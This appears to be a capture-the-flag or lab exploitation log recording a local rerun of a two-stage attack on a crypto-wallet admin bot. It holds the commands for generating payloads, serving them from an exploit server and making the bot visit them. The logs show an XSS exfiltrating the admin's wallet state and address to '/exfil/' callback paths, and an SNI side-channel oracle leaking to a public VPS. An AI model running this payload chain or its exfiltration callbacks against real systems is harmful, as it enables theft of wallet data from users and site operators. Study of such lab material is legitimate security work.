# Local Revalidation 2026-03-09

Target:

`http://localhost:8080`

Bot container:

`dicewallet-bot`

This note records the local rerun performed after the tooling cleanup.

## Environment Check

Commands:

```bash
curl -sS http://localhost:8080/status
curl -i http://localhost:8080/admin/
docker ps
```

Important results:

- `/status` returned `{"ready":true,"activeVisits":0,"maxConcurrent":3}`
- `/admin/` returned `200 OK`
- the local bot container was running on `0.0.0.0:8080->8080/tcp`

## Phase 1 Local Run

Preparation:

```bash
mkdir -p /tmp/local_reval
cp exploits/active/payload.html /tmp/local_reval/payload.html
python3 exploits/generators/stage1_wallet_probe.py \
  --callback-base http://172.17.0.1:8000 \
  --output /tmp/local_reval/z-stage1localstd.js
python3 exploits/servers/exploit_server_final.py 8000 \
  --serve-root /tmp/local_reval \
  --exfil-log /tmp/local_reval/stage1_callbacks.log \
  --http-log /tmp/local_reval/payload_http.log \
  --exploit-path /payload.html
```

Reachability check from inside the bot:

```bash
docker exec dicewallet-bot sh -lc 'wget -qO- http://172.17.0.1:8000/payload.html?t=probe | sed -n "1,4p"'
```

Visit:

```bash
curl -sS -X POST http://localhost:8080/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://172.17.0.1:8000/payload.html?t=stage1localstd"}'
```

Visit response:

```json
{"ok":true,"message":"Visiting http://172.17.0.1:8000/payload.html?t=stage1localstd for up to 45 seconds... (1/3 active)"}
```

Callback log:

```text
[09:01:18] [XSS] {
  "d": [
    "http://localhost:8080|http://localhost:8080/admin/index.html"
  ]
}
[09:01:18] [STATE] {
  "d": [
    "{\"hasWallet\":true,\"accounts\":[{\"name\":\"Admin\",\"address\":\"0x150BE1465309339298eB9369bCA26607f23c1260\",\"active\":true}],\"activeIndex\":0}"
  ]
}
[09:01:18] [ACCTS] {
  "d": [
    "[\"0x150BE1465309339298eB9369bCA26607f23c1260\"]"
  ]
}
[09:01:18] [STAGE1_OK] {}
```

HTTP log:

```text
[2026-03-09T12:01:10Z] 172.17.0.2 - "GET /payload.html?t=stage1localstd HTTP/1.1" 200 -
[2026-03-09T12:01:11Z] 172.17.0.2 - "GET /z-stage1localstd.js HTTP/1.1" 200 -
[2026-03-09T12:01:18Z] 172.17.0.2 - "GET /exfil/XSS?d=http%3A%2F%2Flocalhost%3A8080%7Chttp%3A%2F%2Flocalhost%3A8080%2Fadmin%2Findex.html HTTP/1.1" 200 -
[2026-03-09T12:01:18Z] 172.17.0.2 - "GET /exfil/STATE?d=%7B%22hasWallet%22%3Atrue%2C%22accounts%22%3A%5B%7B%22name%22%3A%22Admin%22%2C%22address%22%3A%220x150BE1465309339298eB9369bCA26607f23c1260%22%2C%22active%22%3Atrue%7D%5D%2C%22activeIndex%22%3A0%7D HTTP/1.1" 200 -
[2026-03-09T12:01:18Z] 172.17.0.2 - "GET /exfil/ACCTS?d=%5B%220x150BE1465309339298eB9369bCA26607f23c1260%22%5D HTTP/1.1" 200 -
[2026-03-09T12:01:18Z] 172.17.0.2 - "GET /exfil/STAGE1_OK HTTP/1.1" 200 -
```

## Phase 2 Local Oracle Attempt

Generated probe:

```bash
python3 exploits/generators/order_payload.py zoo 1 12 \
  --dns-url https://stage2localneg.172.17.0.1.sslip.io:1338 \
  > /tmp/local_reval/z-stage2localneg.js
python3 -u exploits/listeners/oracle_listener_sni.py > /tmp/local_reval/oracle_listener.log 2>&1
```

Visit:

```bash
curl -sS -X POST http://localhost:8080/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://172.17.0.1:8000/payload.html?t=stage2localneg"}'
```

Visit response:

```json
{"ok":true,"message":"Visiting http://172.17.0.1:8000/payload.html?t=stage2localneg for up to 45 seconds... (1/3 active)"}
```

HTTP log:

```text
[2026-03-09T12:02:22Z] 172.17.0.2 - "GET /payload.html?t=stage2localneg HTTP/1.1" 200 -
[2026-03-09T12:02:22Z] 172.17.0.2 - "GET /z-stage2localneg.js HTTP/1.1" 200 -
[2026-03-09T12:02:22Z] 172.17.0.2 - "GET /favicon.ico HTTP/1.1" 404 -
```

Local SNI listener result:

```text
listening
```

Interpretation:

- the bot reached the local payload server
- the stage-2 script executed
- the SNI side channel did not hit `172.17.0.1:1338`

## Phase 2 Public Oracle

Generated probe:

```bash
python3 exploits/generators/order_payload.py zoo 1 12 \
  --dns-url https://stage2localpub.122.218.146.XXX.sslip.io:1338 \
  > /tmp/local_reval/z-stage2localpub.js
```

Visit:

```bash
curl -sS -X POST http://localhost:8080/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://172.17.0.1:8000/payload.html?t=stage2localpub"}'
```

Visit response:

```json
{"ok":true,"message":"Visiting http://172.17.0.1:8000/payload.html?t=stage2localpub for up to 45 seconds... (1/3 active)"}
```

Local HTTP log:

```text
[2026-03-09T12:03:35Z] 172.17.0.2 - "GET /payload.html?t=stage2localpub HTTP/1.1" 200 -
[2026-03-09T12:03:35Z] 172.17.0.2 - "GET /z-stage2localpub.js HTTP/1.1" 200 -
[2026-03-09T12:03:35Z] 172.17.0.2 - "GET /favicon.ico HTTP/1.1" 404 -
```

VPS SNI log excerpt:

```text
[2026-03-09 12:03:40] sni stage2localpub.122.218.146.XXX.sslip.io
[2026-03-09 12:03:40] sni stage2localpub.122.218.146.XXX.sslip.io
[2026-03-09 12:03:41] sni stage2localpub.122.218.146.XXX.sslip.io
[2026-03-09 12:03:42] sni stage2localpub.122.218.146.XXX.sslip.io
[2026-03-09 12:03:43] sni stage2localpub.122.218.146.XXX.sslip.io
[2026-03-09 12:03:45] sni stage2localpub.122.218.146.XXX.sslip.io
[2026-03-09 12:03:46] sni stage2localpub.122.218.146.XXX.sslip.io
[2026-03-09 12:03:47] sni stage2localpub.122.218.146.XXX.sslip.io
```

## Summary

The local rerun confirmed:

- phase 1 works locally with the host callback server on `172.17.0.1:8000`
- the local bot can fetch and execute the same `payload.html` and `z-<token>.js` scheme
- the phase-2 SNI oracle was not reliable on `172.17.0.1:1338`
- the same local bot did trigger the public oracle on `122.218.146.XXX:1338`

## Supplementary local rerun

Later on March 9, 2026, I reran the same local bot again to leave a fresh phase-1 and phase-2 trace with new tokens.

### Stage 1 token `stage1localretest`

Visit:

```bash
curl -sS -X POST http://localhost:8080/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://172.17.0.1:8000/payload.html?t=stage1localretest"}'
```

Observed:

```text
[2026-03-09T13:03:06Z] 172.17.0.2 - "GET /payload.html?t=stage1localretest HTTP/1.1" 200 -
[2026-03-09T13:03:07Z] 172.17.0.2 - "GET /z-stage1localretest.js HTTP/1.1" 200 -
[2026-03-09T13:03:07Z] 172.17.0.2 - "GET /exfil/XSS?d=http%3A%2F%2Flocalhost%3A8080%7Chttp%3A%2F%2Flocalhost%3A8080%2Fadmin%2Findex.html HTTP/1.1" 200 -
[2026-03-09T13:03:07Z] 172.17.0.2 - "GET /exfil/STATE?d=%7B%22hasWallet%22%3Atrue%2C%22accounts%22%3A%5B%7B%22name%22%3A%22Admin%22%2C%22address%22%3A%220x150BE1465309339298eB9369bCA26607f23c1260%22%2C%22active%22%3Atrue%7D%5D%2C%22activeIndex%22%3A0%7D HTTP/1.1" 200 -
[2026-03-09T13:03:07Z] 172.17.0.2 - "GET /exfil/ACCTS?d=%5B%220x150BE1465309339298eB9369bCA26607f23c1260%22%5D HTTP/1.1" 200 -
[2026-03-09T13:03:07Z] 172.17.0.2 - "GET /exfil/STAGE1_OK HTTP/1.1" 200 -
```

### Stage 2 token `stage2localpub2`

Visit:

```bash
curl -sS -X POST http://localhost:8080/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://172.17.0.1:8000/payload.html?t=stage2localpub2"}'
```

Observed on the local HTTP harness:

```text
[2026-03-09T13:03:27Z] 172.17.0.2 - "GET /payload.html?t=stage2localpub2 HTTP/1.1" 200 -
[2026-03-09T13:03:27Z] 172.17.0.2 - "GET /z-stage2localpub2.js HTTP/1.1" 200 -
```

Observed on the VPS oracle:

```text
[2026-03-09 13:03:38] sni stage2localpub2.122.218.146.XXX.sslip.io
[2026-03-09 13:03:38] sni stage2localpub2.122.218.146.XXX.sslip.io
[2026-03-09 13:03:39] sni stage2localpub2.122.218.146.XXX.sslip.io
[2026-03-09 13:03:40] sni stage2localpub2.122.218.146.XXX.sslip.io
[2026-03-09 13:03:41] sni stage2localpub2.122.218.146.XXX.sslip.io
[2026-03-09 13:03:42] sni stage2localpub2.122.218.146.XXX.sslip.io
[2026-03-09 13:03:43] sni stage2localpub2.122.218.146.XXX.sslip.io
[2026-03-09 13:03:45] sni stage2localpub2.122.218.146.XXX.sslip.io
```

This second local rerun confirmed again that:

- the phase-1 trace is reproducible on demand
- the phase-2 popup oracle still produces fresh SNI hits when pointed at the public VPS
